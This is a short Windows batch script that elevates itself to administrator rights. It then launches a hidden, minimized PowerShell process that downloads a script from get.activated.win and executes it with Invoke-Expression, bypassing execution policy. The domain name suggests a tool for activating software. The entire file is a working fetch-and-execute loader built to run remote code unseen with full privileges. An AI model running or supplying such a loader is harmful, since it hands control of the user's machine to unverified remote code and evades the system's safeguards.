@echo off
:: Check for administrative privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
        "Start-Process cmd -ArgumentList '/c %~s0' -Verb RunAs"
    exit /b
)

:: Run PowerShell silently in a detached process
start /min powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
    "$url='https://get.activated.win';"^
    "try {"^
    "    $response = Invoke-WebRequest -Uri $url -UseBasicParsing -ErrorAction Stop;"^
    "    Invoke-Expression $response.Content"^
    "} catch {"^
    "    Write-Host 'Failed to retrieve script from URL.' -ForegroundColor Red"^
    "}"

:: Close CMD immediately
exit /b
